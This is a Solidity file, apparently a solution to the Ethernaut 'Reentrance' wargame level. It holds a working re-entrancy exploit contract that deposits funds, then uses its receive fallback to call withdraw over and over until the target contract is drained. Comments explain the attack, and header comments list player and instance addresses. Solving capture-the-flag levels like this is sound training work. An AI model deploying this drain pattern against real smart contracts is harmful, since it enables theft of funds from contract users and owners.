// => Player address 0x0718eccf37de50e31620C658B2c96adDc1e76300
// => Ethernaut address 0xD991431D8b033ddCb84dAD257f4821E9d5b38C33
// => Instance address 0xb9d7F5A0D3E2435f4134e4567AbA316E853ce641

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Reentrance.sol";

// "re-entrancy attack"
// donate to itself some amount (call the donate function with for example a value of 1 ether)
// then it will automatically call the withdraw function, and when it tries to send the funds
// because of the condition we put in the fallback, when receiving the funds, 
// it will re-enter the withdrawal function and keep withdrawing funds until there is no more

contract HackReentrance {
    Reentrance public reentrance;

    function setAddress(address payable _reentrance) public {
        reentrance = Reentrance(_reentrance);
    }

    function donate() public payable {
        reentrance.donate{value:msg.value}(address(this));
        withdraw();
    }

    function withdraw() private {
        if (address(reentrance).balance >= 0) {
            uint balance = reentrance.balanceOf(address(this));
            reentrance.withdraw(balance);
        }
    }

    receive() external payable {
        withdraw();
    }
}
